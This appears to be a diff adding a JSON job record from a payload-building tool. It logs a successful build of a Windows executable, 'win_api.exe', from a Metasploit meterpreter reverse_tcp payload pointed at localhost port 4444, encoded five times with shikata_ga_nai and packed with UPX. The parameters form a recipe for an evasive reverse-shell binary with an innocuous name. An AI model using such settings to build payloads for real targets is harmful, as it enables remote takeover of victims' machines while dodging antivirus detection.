@@ -1,0 +1,30 @@
+{
+  "id": "c32e14dd-winexe",
+  "date": "20250809",
+  "kind": "winexe",
+  "state": "SUCCEEDED",
+  "created_at": 1754710791.9766462,
+  "started_at": 1754710791.9769478,
+  "finished_at": 1754710797.5129502,
+  "params": {
+    "payload": "windows/meterpreter/reverse_tcp",
+    "lhost": "127.0.0.1",
+    "lport": "4444",
+    "arch": "x86",
+    "output_name": "win_api",
+    "encoders": "x86/shikata_ga_nai:5",
+    "upx": "true"
+  },
+  "artifacts": [
+    {
+      "name": "win_api.exe",
+      "path": "/workspace/tasks/20250809/c32e14dd-winexe/output/win_api.exe",
+      "size_bytes": 48128,
+      "sha256": "059cccf52937cde4dc175a0b552b348982e5235941c3f57032fd38d10ca6fcee"
+    }
+  ],
+  "logs": {
+    "build": "/workspace/tasks/20250809/c32e14dd-winexe/logs/build.log"
+  },
+  "error": null
+}
